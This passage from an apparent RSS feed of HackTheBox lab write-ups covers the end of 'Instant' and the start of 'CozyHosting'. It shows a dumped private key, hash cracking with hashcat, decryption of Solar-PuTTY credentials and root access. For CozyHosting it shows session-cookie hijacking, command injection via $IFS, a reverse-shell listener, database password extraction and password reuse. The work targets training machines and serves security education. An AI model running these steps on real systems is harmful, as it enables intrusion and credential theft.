    &#34;wQCMDTZMyD8WuHpXgcsREvTFTGskIQOuY0NeJz3yOHuiGEdJu227BHP3Q0CRjjHC74fN18\n&#34;,
    &#34;nB8V1c1FJ03Bj9KKJZAsX+nDFSTLxUOy7/T39Fy45/mzA1bjbgRfbhheclGqcOW2ZgpgCK\n&#34;,
    &#34;gzGrFox3onf+N5Dl0Xc9FWdjQFcJi5KKpP/0RNsjoXzU2xVeHi4EGoO+6VW2patq2sblVt\n&#34;,
    &#34;pErOwUa/cKVlTdoUmIyeqqtOHCv6QmtI3kylhahrQw0rcbkSgAAADBAOAK8JrksZjy4MJh\n&#34;,
    &#34;HSsLq1bCQ6nSP+hJXXjlm0FYcC4jLHbDoYWSilg96D1n1kyALvWrNDH9m7RMtS5WzBM3FX\n&#34;,
    &#34;zKCwZBxrcPuU0raNkO1haQlupCCGGI5adMLuvefvthMxYxoAPrppptXR+g4uimwp1oJcO5\n&#34;,
    &#34;SSYSPxMLojS9gg++Jv8IuFHerxoTwr1eY8d3smeOBc62yz3tIYBwSe/L1nIY6nBT57DOOY\n&#34;,
    &#34;CGGElC1cS7pOg/XaOh1bPMaJ4Hi3HUWwAAAMEAvV2Gzd98tSB92CSKct+eFqcX2se5UiJZ\n&#34;,
    &#34;n90GYFZoYuRerYOQjdGOOCJ4D/SkIpv0qqPQNulejh7DuHKiohmK8S59uMPMzgzQ4BRW0G\n&#34;,
    &#34;HwDs1CAcoWDnh7yhGK6lZM3950r1A/RPwt9FcvWfEoQqwvCV37L7YJJ7rDWlTa06qHMRMP\n&#34;,
    &#34;5VNy/4CNnMdXALx0OMVNNoY1wPTAb0x/Pgvm24KcQn/7WCms865is11BwYYPaig5F5Zo1r\n&#34;,
    &#34;bhd6Uh7ofGRW/5AAAAEXNoaXJvaGlnZUBpbnN0YW50AQ==\n&#34;,
    &#34;-----END OPENSSH PRIVATE KEY-----\n&#34;
  ],
  &#34;Status&#34;: 201
}
</code></pre><p>I saved the key to a file and cleaned it up. Below is the vim macro I used:</p>
<pre tabindex="0"><code>:%s/    &#34;//g|%s/&#34;//g|%s/,//g|%s/\\n//g
</code></pre><p>Now we can authenticate as <code>shirohige</code>.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp]
└─$ ssh -i id_rsa shirohige@instant.htb   
Welcome to Ubuntu 24.04.1 LTS (GNU/Linux 6.8.0-45-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the &#39;unminimize&#39; command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Sat Mar 29 20:22:54 2025 from 10.10.14.53
shirohige@instant:~$ 
</code></pre><h2 id="privilege-escalation">Privilege Escalation</h2>
<p>Instant&rsquo;s database is stored at <code>~/projects/mywallet/Instant-Api/mywallet/instance/</code>.</p>
<pre tabindex="0"><code>shirohige@instant:~$ ls -al projects/mywallet/Instant-Api/mywallet/instance/
total 44
drwxr-xr-x 2 shirohige shirohige  4096 Oct  4 15:22 .
drwxr-xr-x 5 shirohige shirohige  4096 Oct  4 15:22 ..
-rw-r--r-- 1 shirohige shirohige 36864 Sep 30 16:34 instant.db
</code></pre><p>Sqlite3 installed though, so I transferred it to my local machine for viewing.</p>
<pre tabindex="0"><code>shirohige@instant:~$ python3 -m http.server 8000 -d projects/mywallet/Instant-Api/mywallet/instance/
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
</code></pre><pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp]
└─$ wget http://instant.htb:8000/instant.db
--2025-03-29 15:30:35--  http://instant.htb:8000/instant.db
Resolving instant.htb (instant.htb)... 10.10.11.37
Connecting to instant.htb (instant.htb)|10.10.11.37|:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 36864 (36K) [application/octet-stream]
Saving to: ‘instant.db’

instant.db                           100%[======================================================================&gt;]  36.00K  --.-KB/s    in 0.05s   

2025-03-29 15:30:35 (674 KB/s) - ‘instant.db’ saved [36864/36864]
</code></pre><p>There is a <code>wallet_users</code> table which has, among others, a password column that we can harvest credentials form.</p>
<pre tabindex="0"><code>sqlite&gt; .schema
CREATE TABLE wallet_users (
        id INTEGER NOT NULL, 
        username VARCHAR, 
        email VARCHAR, 
        wallet_id VARCHAR, 
        password VARCHAR, 
        create_date VARCHAR, 
        secret_pin INTEGER, 
        role VARCHAR, 
        status VARCHAR, 
        PRIMARY KEY (id), 
        UNIQUE (username), 
        UNIQUE (email), 
        UNIQUE (wallet_id)
);
CREATE TABLE wallet_wallets (
        id INTEGER NOT NULL, 
        wallet_id VARCHAR, 
        balance INTEGER, 
        invite_token VARCHAR, 
        PRIMARY KEY (id), 
        UNIQUE (wallet_id), 
        UNIQUE (invite_token)
);
CREATE TABLE wallet_transactions (
        id INTEGER NOT NULL, 
        sender VARCHAR, 
        receiver VARCHAR, 
        amount VARCHAR, 
        txn_fee VARCHAR, 
        note VARCHAR, 
        status VARCHAR, 
        PRIMARY KEY (id)
);
sqlite&gt; 
</code></pre><pre tabindex="0"><code>sqlite&gt; select * from wallet_users;
1|instantAdmin|admin@instant.htb|f0eca6e5-783a-471d-9d8f-0162cbc900db|pbkdf2:sha256:600000$I5bFyb0ZzD69pNX8$e9e4ea5c280e0766612295ab9bff32e5fa1de8f6cbb6586fab7ab7bc762bd978|2024-07-23 00:20:52.529887|87348|Admin|active
2|shirohige|shirohige@instant.htb|458715c9-b15e-467b-8a3d-97bc3fcf3c11|pbkdf2:sha256:600000$YnRgjnim$c9541a8c6ad40bc064979bc446025041ffac9af2f762726971d8a28272c550ed|2024-08-08 20:57:47.909667|42845|instantian|active
</code></pre><p>We get the PBKDF2 hashes for <code>admin@instant.htb</code> and <code>shirohige@instant.htb</code>. With any luck, these passwords may be reused. However, they are curently not in a hashcat-friendly format. Hashcat expects <code>sha256:1000:&lt;base64 encoded salt&gt;:&lt;base64 encoded raw binary value of hash&gt;</code>.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp]
└─$ hashcat -m 10900 --hash-info
hashcat (v6.2.6) starting in hash-info mode

Hash Info:
==========

Hash mode #10900
  Name................: PBKDF2-HMAC-SHA256
  Category............: Generic KDF
  Slow.Hash...........: Yes
  Password.Len.Min....: 0
  Password.Len.Max....: 256
  Salt.Type...........: Embedded
  Salt.Len.Min........: 0
  Salt.Len.Max........: 256
  Kernel.Type(s)......: pure
  Example.Hash.Format.: plain
  Example.Hash........: sha256:1000:NjI3MDM3:vVfavLQL9ZWjg8BUMq6/FB8FtpkIGWYk
  Example.Pass........: hashcat
  Benchmark.Mask......: ?b?b?b?b?b?b?b
  Autodetect.Enabled..: Yes
  Self.Test.Enabled...: Yes
  Potfile.Enabled.....: Yes
  Custom.Plugin.......: No
  Plaintext.Encoding..: ASCII, HEX
</code></pre><p>Our current hashes&rsquo; salts are not base64 encoded, and the hash is in hexadecimal. Luckily, it isn&rsquo;t difficult to convert the hashes we have to a crackable format. I have a script that automates the process:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e"># Convert PBKDF2-HMAC-SHA256 into hashcat-crackable format</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Usage: ./pbkdf2-hmac-sha256.sh &lt;hash_file&gt;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>OUTFILE<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;./crackable_hashes.txt&#39;</span>
</span></span><span style="display:flex;"><span>TEMPFILE<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;./crackable_hashes.tmp&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> read -r line; <span style="color:#66d9ef">do</span>
</span></span><span style="display:flex;"><span>        IFS<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;$&#39;</span> read -r head salt hash <span style="color:#f92672">&lt;&lt;&lt;</span> <span style="color:#e6db74">&#34;</span>$line<span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>        b64_salt<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>echo -n <span style="color:#e6db74">&#34;</span>$salt<span style="color:#e6db74">&#34;</span> | base64<span style="color:#66d9ef">)</span>
</span></span><span style="display:flex;"><span>        b64_hash<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>echo -n <span style="color:#e6db74">&#34;</span>$hash<span style="color:#e6db74">&#34;</span> | xxd -r -p | base64<span style="color:#66d9ef">)</span>
</span></span><span style="display:flex;"><span>        crackable_hash<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span>$head<span style="color:#e6db74">:</span>$b64_salt<span style="color:#e6db74">:</span>$b64_hash<span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>        echo <span style="color:#e6db74">&#34;</span>$crackable_hash<span style="color:#e6db74">&#34;</span> &gt;&gt; <span style="color:#e6db74">&#34;</span>$OUTFILE<span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span> &lt; <span style="color:#e6db74">&#34;</span>$1<span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>sed <span style="color:#e6db74">&#39;s/\$/\:/g&#39;</span> <span style="color:#e6db74">&#34;</span>$OUTFILE<span style="color:#e6db74">&#34;</span> &gt; <span style="color:#e6db74">&#34;</span>$TEMPFILE<span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>mv <span style="color:#e6db74">&#34;</span>$TEMPFILE<span style="color:#e6db74">&#34;</span> <span style="color:#e6db74">&#34;</span>$OUTFILE<span style="color:#e6db74">&#34;</span>
</span></span></code></pre></div><pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp]
└─$ hashcat -a 0 -m 10900 crackable_hashes.txt /usr/share/wordlists/rockyou.txt --show
sha256:600000:WW5SZ2puaW0=:yVQajGrUC8Bkl5vERgJQQf+smvL3YnJpcdiignLFUO0=:estrella
</code></pre><pre tabindex="0"><code>┌──(venv)─(kali㉿kali)-[/tmp]
└─$ python3 ~/opt/SolarPuttyCracker/SolarPuttyCracker.py -p estrella /tmp/sessions-backup.dat 
   ____       __             ___         __   __          _____                 __            
  / __/___   / /___ _ ____  / _ \ __ __ / /_ / /_ __ __  / ___/____ ___ _ ____ / /__ ___  ____
 _\ \ / _ \ / // _ `// __/ / ___// // // __// __// // / / /__ / __// _ `// __//  &#39;_// -_)/ __/
/___/ \___//_/ \_,_//_/   /_/    \_,_/ \__/ \__/ \_, /  \___//_/   \_,_/ \__//_/\_\ \__//_/   
                                                /___/                                         
Trying to decrypt using password: estrella
Decryption successful using password: estrella
[+] DONE Decrypted file is saved in: SolarPutty_sessions_decrypted.txt
                                                                                                                                                   
┌──(venv)─(kali㉿kali)-[/tmp]
└─$ cat SolarPutty_sessions_decrypted.txt 
{
    &#34;Sessions&#34;: [
        {
            &#34;Id&#34;: &#34;066894ee-635c-4578-86d0-d36d4838115b&#34;,
            &#34;Ip&#34;: &#34;10.10.11.37&#34;,
            &#34;Port&#34;: 22,
            &#34;ConnectionType&#34;: 1,
            &#34;SessionName&#34;: &#34;Instant&#34;,
            &#34;Authentication&#34;: 0,
            &#34;CredentialsID&#34;: &#34;452ed919-530e-419b-b721-da76cbe8ed04&#34;,
            &#34;AuthenticateScript&#34;: &#34;00000000-0000-0000-0000-000000000000&#34;,
            &#34;LastTimeOpen&#34;: &#34;0001-01-01T00:00:00&#34;,
            &#34;OpenCounter&#34;: 1,
            &#34;SerialLine&#34;: null,
            &#34;Speed&#34;: 0,
            &#34;Color&#34;: &#34;#FF176998&#34;,
            &#34;TelnetConnectionWaitSeconds&#34;: 1,
            &#34;LoggingEnabled&#34;: false,
            &#34;RemoteDirectory&#34;: &#34;&#34;
        }
    ],
    &#34;Credentials&#34;: [
        {
            &#34;Id&#34;: &#34;452ed919-530e-419b-b721-da76cbe8ed04&#34;,
            &#34;CredentialsName&#34;: &#34;instant-root&#34;,
            &#34;Username&#34;: &#34;root&#34;,
            &#34;Password&#34;: &#34;12**24nzC!r0c%q12&#34;,
            &#34;PrivateKeyPath&#34;: &#34;&#34;,
            &#34;Passphrase&#34;: &#34;&#34;,
            &#34;PrivateKeyContent&#34;: null
        }
    ],
    &#34;AuthScript&#34;: [],
    &#34;Groups&#34;: [],
    &#34;Tunnels&#34;: [],
    &#34;LogsFolderDestination&#34;: &#34;C:\\ProgramData\\SolarWinds\\Logs\\Solar-PuTTY\\SessionLogs&#34;
}
</code></pre><pre tabindex="0"><code>shirohige@instant:~$ su root
Password: 
root@instant:/home/shirohige#
</code></pre>]]></description>
      
    </item>
    
    
    
    <item>
      <title>CozyHosting</title>
      <link>http://localhost:1313/posts/cozyhosting/</link>
      <pubDate>Sat, 25 Jan 2025 21:58:19 -0600</pubDate>
      
      <guid>http://localhost:1313/posts/cozyhosting/</guid>
      <description><![CDATA[<p><img src="/img/cozyhosting/cozyhosting.png" alt="CozyHosting"></p>
<h2 id="description">Description</h2>
<p>CozyHosting is an easy-rated challenge on HackTheBox. The foothold involves finding an exposed user session and exploitating an authenticated
command injection vulnerability. After gaining a shell, we find hardcoded user credentials and exploit sudo permissions to escalate to root.</p>
<h2 id="recon">Recon</h2>
<p>Starting off with a nmap scan, we find 2 open TCP ports: 22 and 80.</p>
<pre tabindex="0"><code># Nmap 7.94SVN scan initiated Sun Jan 26 14:49:51 2025 as: nmap -p- -A -v -oN /tmp/nmap.scan -T4 10.10.11.230
Increasing send delay for 10.10.11.230 from 0 to 5 due to 599 out of 1496 dropped probes since last increase.
Increasing send delay for 10.10.11.230 from 5 to 10 due to 11 out of 16 dropped probes since last increase.
Warning: 10.10.11.230 giving up on port because retransmission cap hit (6).
Nmap scan report for cozyhosting.htb (10.10.11.230)
Host is up (0.041s latency).
Not shown: 65424 closed tcp ports (reset), 109 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)
|_  256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-favicon: Unknown favicon MD5: 72A61F8058A9468D57C3017158769B1F
|_http-title: Cozy Hosting - Home
|_http-server-header: nginx/1.18.0 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=1/26%OT=22%CT=1%CU=42919%PV=Y%DS=2%DC=T%G=Y%TM=6796
OS:A375%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)
OS:SEQ(SP=105%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=106%GCD=1%ISR=109%TI
OS:=Z%CI=Z%II=I%TS=A)SEQ(SP=106%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M5
OS:3CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST11NW7%O
OS:6=M53CST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%D
OS:F=Y%T=40%W=FAF0%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0
OS:%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=
OS:Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%
OS:RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%I
OS:PL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 42.330 days (since Sun Dec 15 07:09:02 2024)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 587/tcp)
HOP RTT      ADDRESS
1   40.73 ms 10.10.14.1
2   40.83 ms cozyhosting.htb (10.10.11.230)

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jan 26 15:04:53 2025 -- 1 IP address (1 host up) scanned in 903.07 seconds
</code></pre><p>Port 80 reveals a website:</p>
<p><img src="/img/cozyhosting/webpage.png" alt="Cozyhosting webpage"></p>
<p>Directory busting reveals the <code>/actuator/</code> subdirectory. Actuator is a module for monitoring Spring Boot websites. Interestingly, we get <code>200 OK</code> responses for Actuator, including <code>/actuator/sessions</code>.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[~]
└─$ dirsearch -u http://cozyhosting.htb --exclude-sizes=0B
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Target: http://cozyhosting.htb/

[16:52:15] Starting: 
[16:52:43] 400 -  435B  - /\..\..\..\..\..\..\..\..\..\etc\passwd           
[16:52:46] 400 -  435B  - /a%5c.aspx                                        
[16:52:50] 200 -  634B  - /actuator                                         
[16:52:51] 200 -  124KB - /actuator/beans                                   
[16:52:51] 200 -    5KB - /actuator/env                                     
[16:52:51] 200 -   15B  - /actuator/health                                  
[16:52:51] 200 -   10KB - /actuator/mappings                                
[16:52:51] 200 -  398B  - /actuator/sessions
[16:52:54] 401 -   97B  - /admin                                            
[16:53:54] 500 -   73B  - /error                                            
[16:54:26] 200 -    4KB - /login                                            
                                                                             
Task Completed
</code></pre><p>Visiting <code>/actuator/sessions</code> reveals a user session for <code>kanderson</code>.</p>
<p><img src="/img/cozyhosting/sessions.png" alt="exposed Actuator sessions"></p>
<h2 id="foothold">Foothold</h2>
<p>We can take over <code>kanderson</code>&rsquo;s session by adding his JSESSIONID cookie to our browser and refreshing the page.</p>
<p><img src="/img/cozyhosting/hijacking.png" alt="Replacing cookie"></p>
<p>If not automatically redirected to <code>http://cozyhosting.htb/admin</code>, heading there should now reveal the Admin dashboard.</p>
<p><img src="/img/cozyhosting/hijacked.png" alt="Web Admin Dashboard"></p>
<p>At the bottom of the page, there is a feature called &ldquo;Cozy Scanner&rdquo; for automatic patch updates.</p>
<p><img src="/img/cozyhosting/web_connection.png" alt="Cozy Scanner"></p>
<p>Tasks submitted to Cozy Scanner get passed to the <code>/executessh</code> endpoint. Some basic testing reveals that a single colon in the <code>username</code> parameter causes a syntax error. It&rsquo;s also revealed that the server is passing user input directly into a shell command as evidenced by <code>/bin/bash -c</code>.</p>
<p><img src="/img/cozyhosting/executessh.png" alt="Command syntax error"></p>
<p>To confirm if we have full command execution, I sent a payload to ping my kali machine. However, the server rejects it because it contains whitespaces.</p>
<p><img src="/img/cozyhosting/injection_whitespace.png" alt="Ping command injection test"></p>
<p>Fortunately, we can use the $IFS variable as an alternative as it represents a whitespace by default.</p>
<p><img src="/img/cozyhosting/IFS.png" alt="IFS command injection"></p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[~]
└─$ sudo tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
17:15:35.692325 IP cozyhosting.htb &gt; 10.10.14.60: ICMP echo request, id 4, seq 1, length 64
17:15:36.741961 IP cozyhosting.htb &gt; 10.10.14.60: ICMP echo request, id 4, seq 2, length 64
</code></pre><p>With command injection confirmed, we can now send a payload and get a reverse shell.</p>
<p><img src="/img/cozyhosting/rce.png" alt="Reverse shell"></p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[~]
└─$ nc -nvlp 21
listening on [any] 21 ...
connect to [10.10.14.60] from (UNKNOWN) [10.10.11.230] 35240
whoami
app
</code></pre><h2 id="privilege-escalation">Privilege Escalation</h2>
<p>After stabilizing the shell, I started enumeration. There is a <code>cloudhosting-0.0.1.jar</code> file in the directory we land in. We can transfer this file
to our local machine for further analysis.</p>
<pre tabindex="0"><code>app@cozyhosting:/app$ ls -al
total 58856
drwxr-xr-x  2 root root     4096 Aug 14  2023 .
drwxr-xr-x 19 root root     4096 Aug 14  2023 ..
-rw-r--r--  1 root root 60259688 Aug 11  2023 cloudhosting-0.0.1.jar
app@cozyhosting:/app$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
</code></pre><pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp]
└─$ wget http://cozyhosting.htb:8000/cloudhosting-0.0.1.jar
--2025-01-27 11:11:47--  http://cozyhosting.htb:8000/cloudhosting-0.0.1.jar
Resolving cozyhosting.htb (cozyhosting.htb)... 10.10.11.230
Connecting to cozyhosting.htb (cozyhosting.htb)|10.10.11.230|:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 60259688 (57M) [application/java-archive]
Saving to: ‘cloudhosting-0.0.1.jar’

cloudhosting-0.0.1.jar             100%[================================================================&gt;]  57.47M   910KB/s    in 60s     

2025-01-27 11:12:47 (986 KB/s) - ‘cloudhosting-0.0.1.jar’ saved [60259688/60259688]
</code></pre><p>And to extract&hellip;</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp/jar]
└─$ jar xf cloudhosting-0.0.1.jar 
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
</code></pre><p>Now we can enumerate the files for credentials. <code>spring.datasource.password</code> in <code>BOOT-INF/classes/application.properties</code>
seems worth digging into.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp/cozy]
└─$ grep -ri passw
grep: cloudhosting-0.0.1.jar: binary file matches
grep: BOOT-INF/classes/htb/cloudhosting/database/CozyUserDetailsService.class: binary file matches
grep: BOOT-INF/classes/htb/cloudhosting/database/CozyUser.class: binary file matches
grep: BOOT-INF/classes/htb/cloudhosting/secutiry/SecurityConfig.class: binary file matches
grep: BOOT-INF/classes/htb/cloudhosting/scheduled/FakeUser.class: binary file matches
BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.css:.ri-lock-password-fill:before { content: &#34;\eecf&#34;; }
BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.css:.ri-lock-password-line:before { content: &#34;\eed0&#34;; }
BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.less:.ri-lock-password-fill:before { content: &#34;\eecf&#34;; }
BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.less:.ri-lock-password-line:before { content: &#34;\eed0&#34;; }
BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.svg:    &lt;glyph glyph-name=&#34;lock-password-fill&#34;
BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.svg:    &lt;glyph glyph-name=&#34;lock-password-line&#34;
grep: BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.eot: binary file matches
BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.symbol.svg:&lt;/symbol&gt;&lt;symbol viewBox=&#34;0 0 24 24&#34; id=&#34;ri-lock-password-fill&#34;&gt;
BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.symbol.svg:&lt;/symbol&gt;&lt;symbol viewBox=&#34;0 0 24 24&#34; id=&#34;ri-lock-password-line&#34;&gt;
grep: BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.ttf: binary file matches
BOOT-INF/classes/templates/login.html:                                        &lt;label for=&#34;yourPassword&#34; class=&#34;form-label&#34;&gt;Password&lt;/label&gt;
BOOT-INF/classes/templates/login.html:                                        &lt;input type=&#34;password&#34; name=&#34;password&#34; class=&#34;form-control&#34; id=&#34;yourPassword&#34;
BOOT-INF/classes/templates/login.html:                                        &lt;div class=&#34;invalid-feedback&#34;&gt;Please enter your password!&lt;/div&gt;
BOOT-INF/classes/templates/login.html:                                    &lt;p th:if=&#34;${param.error}&#34; class=&#34;text-center small&#34;&gt;Invalid username or password&lt;/p&gt;
BOOT-INF/classes/application.properties:spring.datasource.password=Vg&amp;nvzAQ7XxR
grep: BOOT-INF/lib/spring-security-config-6.0.1.jar: binary file matches
grep: BOOT-INF/lib/spring-security-web-6.0.1.jar: binary file matches
grep: BOOT-INF/lib/thymeleaf-spring6-3.1.1.RELEASE.jar: binary file matches
grep: BOOT-INF/lib/tomcat-embed-core-10.1.5.jar: binary file matches
grep: BOOT-INF/lib/spring-webmvc-6.0.4.jar: binary file matches
grep: BOOT-INF/lib/postgresql-42.5.1.jar: binary file matches
grep: BOOT-INF/lib/spring-security-core-6.0.1.jar: binary file matches
grep: BOOT-INF/lib/spring-security-crypto-6.0.1.jar: binary file matches
</code></pre><p>We find PostgreSQL credentials.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp/cozy]
└─$ cat BOOT-INF/classes/application.properties
server.address=127.0.0.1
server.servlet.session.timeout=5m
management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
management.endpoint.sessions.enabled = true
spring.datasource.driver-class-name=org.postgresql.Driver
spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
spring.jpa.hibernate.ddl-auto=none
spring.jpa.database=POSTGRESQL
spring.datasource.platform=postgres
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=Vg&amp;nvzAQ7XxR
</code></pre><p>Querying systemctl reveals that PostgreSQL is indeed running on the CozyHosting server. We can therefore authenticate with the credentials we found.</p>
<pre tabindex="0"><code>app@cozyhosting:/tmp$ systemctl status postgresql
● postgresql.service - PostgreSQL RDBMS
     Loaded: loaded (/lib/systemd/system/postgresql.service; enabled; vendor pr&gt;
     Active: active (exited) since Sat 2025-01-25 22:33:04 UTC; 2h 5min ago
    Process: 1129 ExecStart=/bin/true (code=exited, status=0/SUCCESS)
   Main PID: 1129 (code=exited, status=0/SUCCESS)
        CPU: 804us
</code></pre><p>Authentication:</p>
<pre tabindex="0"><code>app@cozyhosting:/tmp$ psql -U postgres -h 127.0.0.1
Password for user postgres: 
psql (14.9 (Ubuntu 14.9-0ubuntu0.22.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type &#34;help&#34; for help.

postgres=#
</code></pre><p>Further enumeration reveals a users table from the cozyhosting database, which includes password hashes for the <code>kanderson</code> and <code>admin</code> users.</p>
<pre tabindex="0"><code>postgres-# \l
postgres-# \c cozyhosting
cozyhosting=# \dt
cozyhosting=# select * from users;
cozyhosting=# 
</code></pre><pre tabindex="0"><code> kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
</code></pre><p>I was only able to crack the password hash for <code>admin</code>, which doesn&rsquo;t provide much for directly, but we can test for password reuse.</p>
<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp]
└─$ hashcat -a 0 hashes.txt /usr/share/wordlists/rockyou.txt -m 3200 --show
$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm:manchesterunited
</code></pre><p>Looking at system users, <code>root</code>, <code>josh</code>, and <code>postgres</code> seem worth looking into.</p>
<pre tabindex="0"><code>app@cozyhosting:/app$ cat /etc/passwd | grep -v nologin | grep -v false
root:x:0:0:root:/root:/bin/bash
sync:x:4:65534:sync:/bin:/bin/sync
app:x:1001:1001::/home/app:/bin/sh
postgres:x:114:120:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
josh:x:1003:1003::/home/josh:/usr/bin/bash
</code></pre><p>Using <code>manchesterunited</code> as <code>josh</code>&rsquo;s password is successful.</p>
<pre tabindex="0"><code>app@cozyhosting:/tmp$ su josh
Password: 
josh@cozyhosting:/tmp$
</code></pre><p>Checking sudo privileges for <code>josh</code> shows that he can run ssh as root.</p>
<pre tabindex="0"><code>josh@cozyhosting:/tmp$ sudo -l
[sudo] password for josh: 
Matching Defaults entries for josh on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *
</code></pre><p>We can exploit this by using ssh&rsquo;s ProxyCommand feature to execute commands. We will need to direct both stdin and stdout to stderr
in order to see our commands and responses within our current session. Payload courtesy of gtfobins.</p>
